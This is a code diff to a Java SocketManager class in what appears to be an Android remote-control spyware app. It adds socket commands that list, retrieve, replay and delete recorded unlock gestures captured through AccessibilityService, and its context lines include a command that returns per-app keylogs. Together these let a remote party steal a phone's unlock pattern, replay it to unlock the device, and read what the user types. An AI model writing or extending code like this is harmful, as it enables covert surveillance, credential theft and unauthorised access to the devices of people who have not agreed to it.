@@ -865,6 +865,26 @@ public class SocketManager {
             }
         }
 
+        // ── Advanced Unlock ───────────────────────────────────────────────
+        if (command.startsWith("advanced_unlock_")) {
+            if (gestureRecorder == null) {
+                JSONObject er = new JSONObject();
+                er.put("success", false);
+                er.put("error", "Gesture recorder not ready — ensure AccessibilityService is enabled");
+                return er;
+            }
+            switch (command) {
+                case "advanced_unlock_list":
+                    return gestureRecorder.listAdvancedUnlockPatterns();
+                case "advanced_unlock_get":
+                    return gestureRecorder.getAdvancedUnlockPattern(params.getString("filename"));
+                case "advanced_unlock_replay":
+                    return gestureRecorder.replayAdvancedUnlockPattern(params.getString("filename"));
+                case "advanced_unlock_delete":
+                    return gestureRecorder.deleteAdvancedUnlockPattern(params.getString("filename"));
+            }
+        }
+
         // ── App Monitor ──────────────────────────────────────────────────
         if (command.equals("list_app_monitor_apps"))    return appMonitor.listMonitoredApps();
         if (command.equals("get_app_keylogs"))          return appMonitor.getAppKeylogs(params.getString("packageName"), params.optString("date", ""), params.optInt("limit", 200));
